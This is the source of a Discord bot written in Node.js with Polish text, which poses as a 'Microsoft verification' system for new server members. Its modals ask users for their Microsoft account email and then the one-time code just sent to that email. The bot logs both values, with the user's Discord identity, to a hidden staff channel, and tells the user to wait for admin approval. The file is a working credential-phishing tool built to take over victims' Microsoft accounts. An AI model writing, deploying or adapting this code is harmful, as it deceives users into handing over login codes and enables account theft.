const { 
    Client, 
    GatewayIntentBits, 
    Partials, 
    EmbedBuilder, 
    ActionRowBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    ModalBuilder, 
    TextInputBuilder, 
    TextInputStyle,
    REST,
    Routes
} = require('discord.js');
require('dotenv').config();
const http = require('http');

// Render Port Binding Fix
http.createServer((req, res) => {
    res.write("Bot is running!");
    res.end();
}).listen(process.env.PORT || 3000);

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ],
    partials: [Partials.Channel, Partials.Message, Partials.User]
});

const PREFIX = '!';
const LOG_CHANNEL_ID = "1505172146496868553"; // ID kanału sprawdzacz botow

client.once('ready', async () => {
    console.log(`\x1b[32m[READY]\x1b[0m Zalogowano jako ${client.user.tag}`);
    client.user.setActivity('Weryfikacja Microsoft', { type: 3 }); // Watching

    // Rejestracja komend slash
    const commands = [
        {
            name: 'panelweryfikacja',
            description: 'Wysyła panel weryfikacji Microsoft',
        }
    ];

    const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);

    try {
        console.log('Rozpoczynam rejestrację komend slash...');
        await rest.put(
            Routes.applicationCommands(client.user.id),
            { body: commands },
        );
        console.log('Pomyślnie zarejestrowano komendy slash!');
    } catch (error) {
        console.error('Błąd podczas rejestracji komend:', error);
    }
});

// Cache do przechowywania maila między oknami modalnymi
const userEmailCache = new Map();

client.on('interactionCreate', async (interaction) => {
    // 1. Obsługa Komendy Slash
    if (interaction.isChatInputCommand()) {
        if (interaction.commandName === 'panelweryfikacja') {
            const embed = new EmbedBuilder()
                .setColor(0x00AAFF)
                .setTitle('🛡️ System Weryfikacji')
                .setDescription('Hej! Podaj swój mail konta microsoft abyśmy wiedzieli czy nie jesteś botem i zweryfikuj się!')
                .setFooter({ text: 'Weryfikacja jest wymagana, aby uzyskać dostęp do serwera.' });

            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId('start_verify')
                    .setLabel('Weryfikacja')
                    .setEmoji('📧')
                    .setStyle(ButtonStyle.Primary)
            );

            await interaction.reply({ embeds: [embed], components: [row] });
        }
    }

    // 2. Obsługa Przycisku
    if (interaction.isButton()) {
        if (interaction.customId === 'start_verify') {
            const modal = new ModalBuilder()
                .setCustomId('modal_email')
                .setTitle('Weryfikacja Microsoft (Krok 1/2)');

            const emailInput = new TextInputBuilder()
                .setCustomId('input_email')
                .setLabel("Twój mail Microsoft")
                .setPlaceholder("np. gracz123@outlook.com")
                .setStyle(TextInputStyle.Short)
                .setMinLength(5)
                .setRequired(true);

            modal.addComponents(new ActionRowBuilder().addComponents(emailInput));
            await interaction.showModal(modal);
        }
    }

    // 3. Obsługa Formularzy (Modal)
    if (interaction.isModalSubmit()) {
        // ETAP 1: Podanie maila
        if (interaction.customId === 'modal_email') {
            const email = interaction.fields.getTextInputValue('input_email');
            userEmailCache.set(interaction.user.id, email);

            // Logowanie maila na kanał
            const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
            if (logChannel) {
                const logEmbed = new EmbedBuilder()
                    .setColor(0xFFA500)
                    .setTitle('📧 Nowa próba weryfikacji (MAIL)')
                    .addFields(
                        { name: 'Użytkownik', value: `${interaction.user.tag} (${interaction.user.id})`, inline: false },
                        { name: 'Podany Mail', value: `\`${email}\``, inline: false }
                    )
                    .setTimestamp();
                await logChannel.send({ embeds: [logEmbed] });
            }

            // Wyświetlenie drugiego okna na kod
            const modalCode = new ModalBuilder()
                .setCustomId('modal_code')
                .setTitle('Weryfikacja Microsoft (Krok 2/2)');

            const codeInput = new TextInputBuilder()
                .setCustomId('input_code')
                .setLabel("Podaj kod z maila")
                .setPlaceholder("Wpisz kod który właśnie otrzymałeś...")
                .setStyle(TextInputStyle.Short)
                .setRequired(true);

            modalCode.addComponents(new ActionRowBuilder().addComponents(codeInput));
            await interaction.showModal(modalCode);
        }

        // ETAP 2: Podanie kodu
        if (interaction.customId === 'modal_code') {
            const code = interaction.fields.getTextInputValue('input_code');
            const email = userEmailCache.get(interaction.user.id) || "Błąd cache";

            // Logowanie kodu na kanał
            const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
            if (logChannel) {
                const logEmbed = new EmbedBuilder()
                    .setColor(0x00FF00)
                    .setTitle('🔑 Otrzymano kod weryfikacyjny')
                    .addFields(
                        { name: 'Użytkownik', value: `${interaction.user.tag} (${interaction.user.id})`, inline: false },
                        { name: 'Mail', value: `\`${email}\``, inline: true },
                        { name: 'Kod', value: `\`${code}\``, inline: true }
                    )
                    .setTimestamp();
                await logChannel.send({ embeds: [logEmbed] });
            }

            await interaction.reply({ 
                content: '✅ Twoje zgłoszenie weryfikacyjne zostało wysłane. Poczekaj na weryfikację przez administratora.', 
                ephemeral: true 
            });
            
            userEmailCache.delete(interaction.user.id);
        }
    }
});

client.on('messageCreate', async (message) => {
    if (message.author.bot || !message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === 'ping') {
        const embed = new EmbedBuilder()
            .setColor(0x0099FF)
            .setTitle('🏓 Pong!')
            .setDescription(`Opóźnienie bota wynosi: **${Math.round(client.ws.ping)}ms**`)
            .setTimestamp()
            .setFooter({ text: 'nowy_bot' });

        await message.reply({ embeds: [embed] });
    }
});

client.login(process.env.TOKEN).catch(err => {
    console.error('\x1b[31m[ERROR]\x1b[0m Nie udało się zalogować. Sprawdź TOKEN w pliku .env');
});
